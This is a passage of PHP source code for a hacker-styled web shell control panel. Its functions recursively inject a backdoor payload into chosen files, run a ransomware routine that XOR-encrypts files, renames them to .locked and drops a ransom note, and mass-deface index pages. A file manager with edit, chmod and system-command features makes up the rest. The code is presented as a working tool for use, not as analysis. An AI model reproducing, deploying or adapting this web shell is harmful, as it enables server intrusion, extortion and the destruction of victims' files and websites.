        $inj_count = 0;

        if (@is_dir($inj_dir)) {
            $this->do_inject($inj_dir, $inj_files, $inj_payload, $inj_count);
            echo "<div style='color:#ff00ea; margin-top:10px;'>> Injection completed. $inj_count file(s) backdoored.</div>";
        } else {
            echo "<div style='color:red;'>[-] Invalid directory: " . htmlspecialchars($inj_dir) . "</div>";
        }
        $_SESSION['inject_out_text'] = ob_get_clean();
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function do_inject($dir, $t_files, $payload, &$count)
    {
        $files = SysUtils::get_dir_files($dir);
        foreach ($files as $f) {
            if ($f === '.' || $f === '..')
                continue;
            $path = $dir . DIRECTORY_SEPARATOR . $f;
            if (@is_dir($path)) {
                $this->do_inject($path, $t_files, $payload, $count);
            } else {
                $lname = strtolower($f);
                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
                $matched = false;
                foreach ($t_files as $tf) {
                    if ($lname === $tf || $ext === ltrim($tf, '.')) {
                        $matched = true;
                        break;
                    }
                }
                if ($matched) {
                    $content = SysUtils::read_file_content($path);
                    if (strpos($content, $payload) === false) {
                        if (SysUtils::write_file_content($path, $payload . "\n" . $content)) {
                            echo "<div style='color:#00ffff;'>[+] Infected: " . htmlspecialchars($path) . "</div>";
                            $count++;
                        }
                    }
                }
            }
        }
    }


    private function ransomware()
    {
        ob_start();
        echo "<div style='color:lime; margin-bottom:10px;'>[+] Starting Ransomware Protocol...</div>";
        $target = $_POST['ransom_target'];
        $key = $_POST['ransom_key'];
        $action = $_POST['ransom_action'];
        $note = isset($_POST['ransom_note']) ? true : false;
        $count = 0;
        $err = 0;

        if ($target === 'MASS_SESSION' && isset($_SESSION['mass_ransom_items'])) {
            $items = $_SESSION['mass_ransom_items'];
            foreach ($items as $item) {
                if (trim($item) === '')
                    continue;
                $full_path = $this->dir_real . DIRECTORY_SEPARATOR . $item;
                if (!@file_exists($full_path))
                    continue;
                $this->do_ransom($full_path, $key, $action, $count, $err);
            }
            unset($_SESSION['mass_ransom_items']);
            $target = $this->dir_real; // for note placement if dir
        } else {
            if (!@file_exists($target)) {
                echo "<div style='color:red;'>[-] Invalid target: " . htmlspecialchars($target) . "</div>";
                $_SESSION['ransom_out_text'] = ob_get_clean();
                header("Location: ?dir=" . urlencode($this->dir_real));
                exit;
            } else {
                $this->do_ransom($target, $key, $action, $count, $err);
            }
        }

        if ($action === 'encrypt') {
            echo "<div style='color:#ff0000; margin-top:10px; font-weight:bold;'>>> Encryption completed. $count file(s) locked!</div>";
            if ($note && @is_dir($target)) {
                $note_content = "<!DOCTYPE html><html><head><title>SYSTEM LOCKED</title><style>body{background:#220000;color:#00ff00;font-family:'Courier New', monospace;text-align:center;padding:50px;}h1{font-size:40px;color:#ff0000;text-shadow:0 0 10px #ff0000;}p{font-size:18px;} .box{border:2px dashed #ff0000; padding:20px; max-width:800px; margin:0 auto; background:#0c0c0c;}</style></head><body><div class='box'><h1>ALL YOUR FILES ARE ENCRYPTED</h1><p>Your documents, databases, web codes, and other important files have been locked by our ransomware protocol using military-grade encryption.</p><p style='color:#fff;'>To unlock your files, you need to provide the correct decryption key in the panel.</p><p style='color:#ffaa00;'>Do not attempt to modify the .locked files, it might cause permanent data loss!</p></div></body></html>";
                SysUtils::write_file_content($target . DIRECTORY_SEPARATOR . 'readme_locked.html', $note_content);
                echo "<div style='color:#ffaa00;'>> Ransom note deployed as readme_locked.html</div>";
            }
        } else {
            echo "<div style='color:lime; margin-top:10px; font-weight:bold;'>>> Decryption completed. $count file(s) unlocked!</div>";
        }
        if ($err > 0)
            echo "<div style='color:#ffaa00;'>> $err file(s) failed / permission denied.</div>";

        $_SESSION['ransom_out_text'] = ob_get_clean();
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function do_ransom($path, $key, $action, &$count, &$err)
    {
        if (@is_dir($path)) {
            $files = SysUtils::get_dir_files($path);
            foreach ($files as $f) {
                if ($f === '.' || $f === '..')
                    continue;
                $this->do_ransom($path . DIRECTORY_SEPARATOR . $f, $key, $action, $count, $err);
            }
        } else {
            if (basename($path) === 'readme_locked.html' || basename($path) === basename(__FILE__))
                return;
            $content = SysUtils::read_file_content($path);
            if ($content === false || $content === '')
                return;
            $is_encrypted = (substr($content, 0, 9) === 'ENC1337::');

            if ($action === 'encrypt' && !$is_encrypted) {
                $enc = $this->xor_crypt($content, $key);
                $enc = 'ENC1337::' . base64_encode($enc);
                if (SysUtils::write_file_content($path, $enc)) {
                    @rename($path, $path . '.locked');
                    $count++;
                } else {
                    $err++;
                }
            } elseif ($action === 'decrypt') {
                $ext = pathinfo($path, PATHINFO_EXTENSION);
                if ($ext === 'locked') {
                    if ($is_encrypted) {
                        $raw = base64_decode(substr($content, 9));
                        $dec = $this->xor_crypt($raw, $key);
                        if (SysUtils::write_file_content($path, $dec)) {
                            @rename($path, substr($path, 0, -7));
                            $count++;
                        } else {
                            $err++;
                        }
                    } else {
                        @rename($path, substr($path, 0, -7));
                    }
                }
            }
        }
    }

    private function xor_crypt($data, $key)
    {
        $out = '';
        $kl = strlen($key);
        $dl = strlen($data);
        for ($i = 0; $i < $dl; $i++)
            $out .= $char = $data[$i] ^ $key[$i % $kl];
        return $out;
    }

    private function deface()
    {
        ob_start();
        echo "<div style='color:lime; margin-bottom:10px;'>[+] Starting Mass Auto Defacer...</div>";
        $def_dir = $_POST['def_dir'];
        $def_payload = $_POST['def_payload'];
        $def_count = 0;

        if (@is_dir($def_dir)) {
            $this->do_deface($def_dir, $def_payload, $def_count);
            if ($def_count == 0)
                echo "<div style='color:#ffaa00;'>[!] No index files found to deface in the specified directory.</div>";
            else
                echo "<div style='color:#ff0000; margin-top:10px; font-weight:bold;'>>> Deface completed. $def_count main page(s) overwritten!</div>";
        } else {
            echo "<div style='color:red;'>[-] Invalid directory: " . htmlspecialchars($def_dir) . "</div>";
        }
        $_SESSION['deface_out_text'] = ob_get_clean();
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function do_deface($dir, $payload, &$count)
    {
        $targets = ['index.php', 'index.html', 'default.php', 'default.html', 'home.php', 'home.html'];
        $files = SysUtils::get_dir_files($dir);
        foreach ($files as $f) {
            if ($f === '.' || $f === '..')
                continue;
            $path = $dir . DIRECTORY_SEPARATOR . $f;
            if (@is_dir($path)) {
                $this->do_deface($path, $payload, $count);
            } else {
                $lname = strtolower($f);
                if (in_array($lname, $targets)) {
                    if (!@file_exists($path . '.bak'))
                        @copy($path, $path . '.bak');
                    if (SysUtils::write_file_content($path, $payload)) {
                        echo "<div style='color:#ff0000;'>[+] Defaced Main Page: " . htmlspecialchars($path) . " <i>(Original backed up to .bak)</i></div>";
                        $count++;
                    }
                }
            }
        }
    }
}

// ==========================================
// [ MAIN APP CONTROLLER ]
// ==========================================
class StealthApplication
{
    private $dir_real;

    public function __construct()
    {
        Authenticator::check();
        $dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);
        $this->dir_real = realpath($dir) ?: $dir;
    }

    public function run()
    {
        if (isset($_GET['logout'])) {
            session_destroy();
            header("Location: ?");
            exit;
        }

        $fileManager = new FileManager($this->dir_real);
        $fileManager->process();

        $advancedTools = new AdvancedTools($this->dir_real);
        $advancedTools->process();

        return $this->dir_real;
    }
}

// Boot the Application
$app = new StealthApplication();
$dir_real = $app->run();

// ==========================================
// [ UI RENDER DATA PREP ]
// ==========================================
$msg = isset($_SESSION['sys_msg']) ? $_SESSION['sys_msg'] : "";
if ($msg)
    unset($_SESSION['sys_msg']);

// ==========================================
// [ UI FRONT-END ENGINE  ]
// ==========================================
// Tampilan UI bergaya Hacker dengan Tabel

echo "<!DOCTYPE html><html><head><title>~ System ~</title>
<style>
    * { box-sizing: border-box; }
    /* scrollbar-gutter: stable → scrollbar selalu ambil slot, layout tidak geser-geser saat scrollbar muncul/hilang */
    html { overflow-y: scroll; scrollbar-gutter: stable; }
    body { background-color: #0c0c0c; color: #00ff00; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; font-size: 14px; overflow-x: hidden; }
    a { text-decoration: none; color: #00ff00; transition: all 0.2s; }
    a:hover { color: #fff; text-shadow: 0 0 5px #00ff00; }
    .container { max-width: 95%; margin: 0 auto; }
    .header { border-bottom: 2px dashed #00ff00; padding-bottom: 15px; margin-bottom: 20px; display: flex; flex-wrap: wrap; justify-content: space-between; align-items:center; gap: 15px; }
    .header-left h1 { margin: 0; font-size: 24px; color: #00ff00; text-shadow: 0 0 5px #00ff00; letter-spacing: 2px; }
    .path-bar { font-size: 16px; margin-top: 5px; color: #00bfff; word-break: break-all; display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
    .rt-badge { font-size:10px; padding:2px 6px; border:1px dashed lime; color:lime; text-shadow:0 0 3px lime; box-shadow:0 0 5px rgba(0,255,0,0.3); font-weight:bold; letter-spacing:1px; transition:0.3s; }
    .btn-logout { background: #ff0000; color: #fff; padding: 8px 15px; font-weight: bold; border: 1px dashed #ff0000; transition: 0.3s; white-space: nowrap; }
    .btn-logout:hover { background: transparent; color: #ff0000; text-shadow: 0 0 5px #ff0000; }
    .sys-info { margin-bottom: 20px; padding: 15px; border: 1px dashed #333; background: #080808; color: #aaa; display: flex; flex-wrap: wrap; gap: 15px; align-items: center; }
    .sys-info div { display: inline-flex; align-items: center; background: #111; padding: 5px 10px; border: 1px dashed #222; border-radius: 3px; }
    .sys-info span { color: #fff; font-weight: bold; margin-left: 8px; color: #00ff00; }
    .table-responsive { width: 100%; max-height: 65vh; overflow-y: auto; overflow-x: auto; margin-bottom: 20px; border: 1px dashed #333; background: #080808; }
    table { width: 100%; border-collapse: separate; border-spacing: 0; min-width: 800px; }
    th { position: sticky; top: 0; z-index: 10; text-align: left; padding: 12px 10px; border-bottom: 2px dashed #00bfff; color: #00bfff; text-transform: uppercase; background: #111; letter-spacing: 1px; }
    td { padding: 10px; border-bottom: 1px dashed #222; vertical-align: middle; }
    tr:hover td { background-color: #1a1a1a; box-shadow: inset 0 0 10px rgba(0,255,0,0.1); }
    @media (max-width: 768px) {
        body { padding: 5px; }
        .container { max-width: 100%; }
        .header { flex-direction: column; align-items: stretch; text-align: center; }
        .header-left h1 { font-size: 20px; }
        .path-bar { justify-content: center; font-size: 13px; margin-top: 10px; }
        .btn-logout { width: 100%; margin-top: 15px; }
        .sys-info { align-items: stretch; padding: 10px; gap: 8px; }
        .sys-info div { justify-content: space-between; font-size: 12px; }
        .tools-btn-group { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 8px; padding: 10px; }
        .tool-trigger-btn { font-size: 11px; padding: 10px 5px; white-space: normal; height: 100%; display: flex; align-items: center; justify-content: center; text-align: center; }
        /* HUD di mobile: tetap fixed height agar tidak geser layout saat hover/touch */
        #hud_info { flex-direction: row; text-align: left; padding: 10px 12px; align-items: flex-start !important; min-height: 70px !important; max-height: 70px !important; }
        #hud_info div:first-child { margin-right: 12px; margin-bottom: 0; font-size: 16px !important; flex-shrink: 0; }
        #hud_text { justify-content: flex-start; font-size: 11px !important; text-align: left; display: -webkit-box !important; -webkit-line-clamp: 3; -webkit-box-orient: vertical; overflow: hidden; word-wrap: break-word; word-break: break-word; }
        .modal-content { width: 100% !important; height: 100% !important; max-width: 100% !important; max-height: 100% !important; border-radius: 0; border: none; }
        .modal-content form { padding: 15px !important; }
        .modal-header h3 { font-size: 16px; word-break: break-all; }
        .modal-footer { flex-direction: column; }
        .btn-cancel { width: 100%; text-align: center; margin-bottom: 10px; }
        .editor-area { min-height: 200px; font-size: 12px; }
        .action-btn { font-size: 11px; padding: 6px 8px; margin-bottom: 3px; display: inline-block; }
        td, th { padding: 8px 5px; font-size: 12px; }
    }
    @media (max-width: 480px) {
        .tools-btn-group { grid-template-columns: 1fr; }
        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; }
        .action-btn { width: 100%; box-sizing: border-box; text-align: center; margin: 0; }
        table { min-width: 500px; }
        .sys-info span { max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    }
    .dir { color: #00bfff; font-weight: bold; }
    .file { color: #eee; }
    .perms { color: #aaa; }
    .actions { display: flex; gap: 5px; align-items: center; flex-wrap: wrap; }
    .action-btn { font-size: 11px; cursor: pointer; padding: 4px 8px; border: 1px dashed transparent; font-weight: bold; border-radius: 2px; }
    .action-view { color: #00bfff; border-color: #00bfff; background: rgba(0, 191, 255, 0.15); } .action-view:hover { background: #00bfff; color: #000; }
    .action-edit { color: #ffaa00; border-color: #ffaa00; background: rgba(255, 170, 0, 0.15); } .action-edit:hover { background: #ffaa00; color: #000; }
    .action-rename { color: #00ff00; border-color: #00ff00; background: rgba(0, 255, 0, 0.15); } .action-rename:hover { background: #00ff00; color: #000; }
    .action-chmod { color: #bb88ff; border-color: #bb88ff; background: rgba(187, 136, 255, 0.15); } .action-chmod:hover { background: #bb88ff; color: #000; }
    .action-dl { color: #ffff00; border-color: #ffff00; background: rgba(255, 255, 0, 0.15); } .action-dl:hover { background: #ffff00; color: #000; }
    .action-uz { color: #ff00ff; border-color: #ff00ff; background: rgba(255, 0, 255, 0.15); } .action-uz:hover { background: #ff00ff; color: #000; }
    .action-del { color: #ff4444; border-color: #ff4444; background: rgba(255, 68, 68, 0.15); } .action-del:hover { background: #ff4444; color: #000; }
    .action-hash { color: #00ffff; border-color: #00ffff; background: rgba(0, 255, 255, 0.15); } .action-hash:hover { background: #00ffff; color: #000; }
    .action-cp { color: #ff00ea; border-color: #ff00ea; background: rgba(255, 0, 234, 0.15); } .action-cp:hover { background: #ff00ea; color: #000; }
    .action-mv { color: #ffab00; border-color: #ffab00; background: rgba(255, 171, 0, 0.15); } .action-mv:hover { background: #ffab00; color: #000; }
    .forms-container { display: flex; flex-wrap: wrap; gap: 20px; margin-top: 20px; }
    .tool-box { flex: 1; min-width: 300px; background: #111; padding: 15px; border: 1px dashed #333; box-sizing: border-box; overflow: hidden; }
    .tool-box h3 { margin-top: 0; color: #00bfff; font-size: 16px; border-bottom: 1px dashed #333; padding-bottom: 10px; margin-bottom: 15px; }
    .tool-box form { display: flex; flex-direction: column; align-items: stretch; margin: 0; gap: 15px; }
    .inline-form { display: inline-flex; margin: 0; padding: 0; background: transparent; border: none; align-items: center; }
    .inline-input { width: 70px; padding: 2px !important; margin-right: 3px !important; font-size: 11px !important; text-align: center; }
    .inline-select { background: #0c0c0c; color: #00ff00; border: 1px dashed #00ff00; padding: 1px 5px; font-family: inherit; font-size: 11px; outline: none; cursor: pointer; }
    .inline-select option { background: #0c0c0c; color: #00ff00; }
    .inline-btn { padding: 2px 5px !important; font-size: 11px !important; }
    input[type=text], input[type=file] { box-sizing: border-box; min-width: 150px; background: transparent; border: 1px dashed #00ff00; color: #00ff00; font-family: inherit; font-size: inherit; padding: 8px; flex-grow: 1; outline: none; }
    input[type=text]:focus { box-shadow: 0 0 5px #00ff00; }
    input[type=submit], button { box-sizing: border-box; background: #00ff00; color: #000; border: none; font-weight: bold; padding: 8px 15px; cursor: pointer; font-family: inherit; white-space: nowrap; flex-shrink: 0; }
    /* hover hanya pakai opacity agar tidak trigger layout reflow */
    input[type=submit]:hover, button:hover { opacity: 0.85; }
    pre { padding: 10px; border: 1px dashed #333; background: #111; color: #ccc; overflow-x: auto; max-height: 400px; margin-top: 10px; }
    .message { margin-bottom: 15px; font-weight: bold; padding: 10px; border: 1px dashed #333; background:#111; }
    
    /* Popup styling */
    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; display: flex; justify-content: center; align-items: center; }
    .modal-content { background: #0c0c0c; border: 2px dashed #00bfff; width: 95%; max-width: 1200px; height: 90vh; display: flex; flex-direction: column; box-shadow: 0 0 30px rgba(0,191,255,0.2); }
    .modal-header { padding: 15px; border-bottom: 1px dashed #00bfff; display: flex; justify-content: space-between; align-items: center; background: #111; flex-shrink: 0; }
    .modal-header h3 { margin: 0; color: #00bfff; display: flex; align-items: center; }
    .modal-close { color: #ff4444; cursor: pointer; font-weight: bold; padding: 5px 15px; border: 1px dashed #ff4444; }
    .modal-close:hover { background: #ff4444; color: #fff; }
    .modal-body { padding: 15px; overflow-y: auto; flex-grow: 1; display: flex; flex-direction: column; height: 100%; width: 100%; box-sizing: border-box; }
    .editor-area { width: 100%; height: 100%; min-height: 400px; flex-grow: 1; background: #080808; color: #00ff00; border: 1px dashed #333; padding: 10px; font-family: monospace; resize: none; box-sizing: border-box; outline: none; }
    .editor-area:focus { border-color: #00ff00; box-shadow: inset 0 0 10px rgba(0,255,0,0.1); }
    .modal-footer { padding: 10px 15px; border-top: 1px dashed #333; background: #111; display: flex; justify-content: flex-end; gap: 10px; flex-shrink: 0; width: 100%; box-sizing: border-box; }
    .btn-cancel { background: transparent; color: #ffaa00; border: 1px dashed #ffaa00; cursor: pointer; padding: 8px 20px; font-weight: bold; display: inline-block; }
    .btn-cancel:hover { background: #ffaa00; color: #000; }
    .tools-btn-group { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; padding: 10px; background: #080808; border: 1px dashed #333; }
    .tool-trigger-btn { background: transparent; color: #00bfff; border: 1px dashed #00bfff; padding: 8px 15px; font-weight: bold; cursor: pointer; transition: opacity 0.2s; }
    .tool-trigger-btn:hover { opacity: 0.7; }
    /* HUD info box: fixed height supaya tidak push layout saat teks berubah */
    #hud_info { min-height: 80px; max-height: 80px; overflow: hidden; }
    #hud_text { overflow: hidden; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; }
    /* Custom Scrollbar */
    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: #0c0c0c; border-left: 1px dashed #333; border-top: 1px dashed #333; }
    ::-webkit-scrollbar-thumb { background: #00bfff; }
    ::-webkit-scrollbar-thumb:hover { background: #00ff00; }
    * { scrollbar-width: thin; scrollbar-color: #00bfff #0c0c0c; }
    
    .cmd-scroll::-webkit-scrollbar { width: 3px; height: 3px; }
    .cmd-scroll::-webkit-scrollbar-track { background: transparent; border: none; }
    .cmd-scroll::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 3px; }
    .cmd-scroll { scrollbar-width: thin; scrollbar-color: #00ff00 transparent; }

    /* Floating Plugins */
    /* z-index 999 agar float buttons muncul di bawah modal overlay (z-index: 1000) */
    .float-container { position: fixed; bottom: 20px; right: 20px; display: flex; flex-direction: column; align-items: flex-end; gap: 10px; z-index: 999; }
    .float-btn { display: flex; justify-content: center; align-items: center; background: #111; border: 1px dashed #00bfff; color: #00bfff; width: 40px; height: 40px; cursor: pointer; border-radius: 5px; font-weight: bold; opacity: 0.8; transition: 0.3s; font-size: 18px; outline: none; padding: 0; }
    .float-btn:hover { opacity: 1; background: #00bfff; color: #000; box-shadow: 0 0 10px rgba(0,191,255,0.7); }
    #btn_totop { border-color: #ff00ea; color: #ff00ea; display: none; }
    #btn_totop:hover { background: #ff00ea; color: #000; box-shadow: 0 0 10px rgba(255,0,234,0.7); }
    
    /* G-Translate Styling overrides */
    #google_translate_element { margin-bottom: 5px; background: #111; padding: 5px; border: 1px dashed #00ff00; border-radius: 5px; display: none; }
    #google_translate_element select { background: #0c0c0c; color: #00ff00; border: 1px solid #00ff00; padding: 5px; font-family: inherit; font-size: 12px; outline: none; cursor: pointer; max-width: 150px; }
    .goog-te-banner-frame.skiptranslate, .goog-te-gadget-icon { display: none !important; }
    body { top: 0px !important; }
    .goog-te-gadget { color: transparent !important; }
</style>
</head><body>
<div class='container'>";

// Buat link parent agar tombol close mengarah ke folder saat ini (link paling bersih)
$close_link = "?dir=" . urlencode($dir_real);

$display_path = str_replace('\\', '/', $dir_real);
if (strpos($display_path, '/') !== 0)
    $display_path = '/' . $display_path;
$display_path = "~" . $display_path;

// Block Edit File Popup
if (isset($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    if (@file_exists($edit_file) && !@is_dir($edit_file)) {
        $file_content = SysUtils::read_file_content($edit_file);
        echo "<div class='modal-overlay'>
                <div class='modal-content'>
                    <div class='modal-header'>
                        <h3 style='color:#ffaa00;'>>> EDITING: " . htmlspecialchars(basename($edit_file)) . "</h3>
                    </div>
                    <form method='post' action='?dir=" . urlencode($dir_real) . "' style='display:flex; flex-direction:column; flex-grow:1; height:100%; width:100%; align-items:stretch;'>
                        <div class='modal-body'>
                            <input type='hidden' name='edit_file' value='" . htmlspecialchars($edit_file, ENT_QUOTES) . "'>
                            <textarea name='file_content' class='editor-area' spellcheck='false'>" . htmlspecialchars($file_content) . "</textarea>
                        </div>
                        <div class='modal-footer'>
                            <a href='$close_link' class='btn-cancel' style='padding:8px 20px; font-weight:bold;'>CANCEL</a>
                            <button type='submit'>SAVE CHANGES</button>
                        </div>
                    </form>
                </div>
              </div>";
    }
}
// Block View File Popup
elseif (isset($_GET['view'])) {
    $view_file = $_GET['view'];
    if (@file_exists($view_file) && !@is_dir($view_file)) {
        echo "<div class='modal-overlay'>
                <div class='modal-content'>
                    <div class='modal-header'>
                        <h3>>> VIEWING: " . htmlspecialchars(basename($view_file)) . "</h3>
                    </div>
                    <div class='modal-body'>
                        <textarea class='editor-area' readonly style='color:#ccc;'>" . htmlspecialchars(SysUtils::read_file_content($view_file)) . "</textarea>
                    </div>
                    <div class='modal-footer'>
                        <a href='$close_link' class='btn-cancel' style='padding:8px 20px; font-weight:bold;'>CLOSE</a>
                    </div>
                </div>
              </div>";
    }
}

// Block Rename Popup
elseif (isset($_GET['rename'])) {
    $rename_file = $_GET['rename'];
    if (@file_exists($rename_file)) {
        echo "<div class='modal-overlay'>
                <div class='modal-content' style='height: auto; max-width: 500px; min-height: unset;'>
                    <div class='modal-header'>
                        <h3 style='color:#00ff00;'>>> RENAMING</h3>
                    </div>
                    <form method='post' action='?dir=" . urlencode($dir_real) . "' style='padding:20px; display:flex; flex-direction:column; gap:15px; flex-grow:0; height:auto; background: #0c0c0c; width:100%; box-sizing:border-box;'>
                        <input type='hidden' name='rename_file' value='" . htmlspecialchars($rename_file, ENT_QUOTES) . "'>
                        <label style='color:#bbb;'>Current Name: <br><strong style='color:#00bfff; word-break: break-all;'>" . htmlspecialchars(basename($rename_file)) . "</strong></label>
                        <input type='text' name='new_name' value='" . htmlspecialchars(basename($rename_file)) . "' style='font-size: 16px; padding: 10px; width: 100%; box-sizing: border-box; background: #111; color: #00ff00; border: 1px dashed #00ff00;' required autofocus>
                        <div style='display: flex; justify-content: flex-end; gap: 10px; margin-top: 10px;'>
                            <a href='$close_link' class='btn-cancel' style='padding:8px 20px; font-weight:bold;'>CANCEL</a>
                            <button type='submit'>RENAME</button>
                        </div>
                    </form>
                </div>
              </div>";
    }
}

// Block Move Popup
elseif (isset($_GET['move'])) {
    $move_file = $_GET['move'];
    if (@file_exists($move_file)) {
        echo "<div class='modal-overlay'>
                <div class='modal-content' style='height: auto; max-width: 500px; min-height: unset;'>
                    <div class='modal-header'>
                        <h3 style='color:#ffab00;'>>> MOVE ITEM</h3>
                    </div>
                    <form method='post' action='?dir=" . urlencode($dir_real) . "' style='padding:20px; display:flex; flex-direction:column; gap:15px; flex-grow:0; height:auto; background: #0c0c0c; width:100%; box-sizing:border-box;'>
                        <input type='hidden' name='move_item' value='" . htmlspecialchars($move_file, ENT_QUOTES) . "'>
                        <label style='color:#bbb;'>Moving Target: <br><strong style='color:#00bfff; word-break: break-all;'>" . htmlspecialchars(basename($move_file)) . "</strong></label>
                        <label style='color:#bbb;'>Destination Path / New Location:</label>
                        <input type='text' name='dest_path' value='" . htmlspecialchars($move_file) . "' style='font-size: 14px; padding: 10px; width: 100%; box-sizing: border-box; background: #111; color: #ffab00; border: 1px dashed #ffab00;' required autofocus>
                        <div style='display: flex; justify-content: flex-end; gap: 10px; margin-top: 10px;'>
                            <a href='$close_link' class='btn-cancel' style='padding:8px 20px; font-weight:bold;'>CANCEL</a>
                            <button type='submit' style='background:#ffab00; color:#000;'>MOVE ITEM</button>
                        </div>
                    </form>
                </div>
              </div>";
    }
}

// Block Copy Popup
elseif (isset($_GET['copy'])) {
    $copy_file = $_GET['copy'];
    if (@file_exists($copy_file)) {
        echo "<div class='modal-overlay'>
                <div class='modal-content' style='height: auto; max-width: 500px; min-height: unset;'>
                    <div class='modal-header'>
                        <h3 style='color:#ff00ea;'>>> COPY / DUPLICATE ITEM</h3>
                    </div>
                    <form method='post' action='?dir=" . urlencode($dir_real) . "' style='padding:20px; display:flex; flex-direction:column; gap:15px; flex-grow:0; height:auto; background: #0c0c0c; width:100%; box-sizing:border-box;'>
                        <input type='hidden' name='copy_item' value='" . htmlspecialchars($copy_file, ENT_QUOTES) . "'>
                        <label style='color:#bbb;'>Copying Target: <br><strong style='color:#00bfff; word-break: break-all;'>" . htmlspecialchars(basename($copy_file)) . "</strong></label>
                        <label style='color:#bbb;'>Destination Path / New Name:</label>
                        <input type='text' name='dest_path' value='" . htmlspecialchars($copy_file) . "_copy' style='font-size: 14px; padding: 10px; width: 100%; box-sizing: border-box; background: #111; color: #ff00ea; border: 1px dashed #ff00ea;' required autofocus>
                        <div style='display: flex; justify-content: flex-end; gap: 10px; margin-top: 10px;'>
                            <a href='$close_link' class='btn-cancel' style='padding:8px 20px; font-weight:bold;'>CANCEL</a>
                            <button type='submit' style='background:#ff00ea; color:#fff;'>COPY ITEM</button>
                        </div>
                    </form>
                </div>
              </div>";
    }
}

// Block Chmod Popup
elseif (isset($_GET['chmod'])) {
    $chmod_file = $_GET['chmod'];
    if (@file_exists($chmod_file)) {
        // Ambil permissions eksisting sebagai default value jika memungkinkan
        $c_perms = substr(sprintf('%o', @fileperms($chmod_file)), -4);
        echo "<div class='modal-overlay'>
                <div class='modal-content' style='height: auto; max-width: 450px; min-height: unset;'>
                    <div class='modal-header'>
                        <h3 style='color:#bb88ff;'>>> CHMOD</h3>
                    </div>
                    <form method='post' action='?dir=" . urlencode($dir_real) . "' style='padding:20px; display:flex; flex-direction:column; gap:15px; flex-grow:0; height:auto; background: #0c0c0c; width:100%; box-sizing:border-box;'>
                        <input type='hidden' name='chmod_file' value='" . htmlspecialchars($chmod_file, ENT_QUOTES) . "'>
                        <label style='color:#bbb;'>Target: <br><strong style='color:#00bfff; word-break: break-all;'>" . htmlspecialchars(basename($chmod_file)) . "</strong></label>
                        <select name='new_perms' style='font-size: 16px; padding: 10px; width: 100%; box-sizing: border-box; background: #111; color: #bb88ff; border: 1px dashed #bb88ff; cursor: pointer; outline:none;' required autofocus>
                            <option value='0777' " . ($c_perms == '0777' ? 'selected' : '') . ">0777 - Full Access / Public</option>
                            <option value='0755' " . ($c_perms == '0755' ? 'selected' : '') . ">0755 - Read & Execute (Standard Dir)</option>
                            <option value='0644' " . ($c_perms == '0644' ? 'selected' : '') . ">0644 - Read Only (Standard Server File)</option>
                            <option value='0666' " . ($c_perms == '0666' ? 'selected' : '') . ">0666 - Read & Write (Public)</option>
                            <option value='0444' " . ($c_perms == '0444' ? 'selected' : '') . ">0444 - Strict Read Only</option>
                        </select>
                        <div style='display: flex; justify-content: flex-end; gap: 10px; margin-top: 10px;'>
                            <a href='$close_link' class='btn-cancel' style='padding:8px 20px; font-weight:bold;'>CANCEL</a>
                            <button type='submit' style='background:#bb88ff; color:#000;'>APPLY CHMOD</button>
                        </div>
                    </form>
                </div>
              </div>";
    }
}

// Block File Hash Popup
elseif (isset($_GET['hash'])) {
    $hash_file = $_GET['hash'];
    if (@file_exists($hash_file) && !@is_dir($hash_file)) {
        $md5 = md5_file($hash_file);
        $sha1 = sha1_file($hash_file);
        $sha256 = hash_file('sha256', $hash_file);
        echo "<div class='modal-overlay'>
                <div class='modal-content' style='height: auto; max-width: 500px; min-height: unset;'>
                    <div class='modal-header'>
                        <h3 style='color:#00ffff;'>>> FILE HASHES</h3>
                    </div>
                    <div class='modal-body' style='background:#0c0c0c; display:flex; flex-direction:column; gap:15px; padding:20px;'>
                        <label style='color:#bbb;'>Target: <br><strong style='color:#00bfff; word-break: break-all;'>" . htmlspecialchars(basename($hash_file)) . "</strong></label>
                        <div><strong style='color:#ffaa00;'>MD5:</strong><br><input type='text' value='$md5' readonly style='width:100%; border:1px dashed #ffaa00; background:#111; color:#ffaa00; padding:8px;' onclick='this.select()'></div>
                        <div><strong style='color:#00ff00;'>SHA1:</strong><br><input type='text' value='$sha1' readonly style='width:100%; border:1px dashed #00ff00; background:#111; color:#00ff00; padding:8px;' onclick='this.select()'></div>
                        <div><strong style='color:#bb88ff;'>SHA256:</strong><br><input type='text' value='$sha256' readonly style='width:100%; border:1px dashed #bb88ff; background:#111; color:#bb88ff; padding:8px;' onclick='this.select()'></div>
                    </div>
                    <div class='modal-footer' style='justify-content: flex-end;'>
                        <a href='$close_link' class='btn-cancel' style='padding:8px 20px; font-weight:bold;'>CLOSE</a>
                    </div>
                </div>
              </div>";
    }
}

echo "<div class='header'>
        <div class='header-left'>
            <h1>[ SYSTEM CONTROL PANEL ]</h1>
            <div class='path-bar'>
                <span>Location: <b>{$display_path}</b></span>
                <span id='rt_badge' class='rt-badge'>REALTIME: ON</span>
            </div>
        </div>
        <a href='?logout=1' class='btn-logout'>[ LOGOUT ]</a>
      </div>";

$free_space = @disk_free_space($dir_real);
$total_space = @disk_total_space($dir_real);
$disk_free = $free_space ? round($free_space / 1073741824, 2) . " GB" : "Unknown";
$disk_total = $total_space ? round($total_space / 1073741824, 2) . " GB" : "Unknown";

// Detect SSD / HDD (OS Dependent heuristic)
$drive_type = "HDD";
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    // Basic heuristic: check if C drive is likely SSD using fsutil/wmic if possible (often blocked)
    $wmic = SysUtils::exe("wmic diskdrive get MediaType 2>nul");
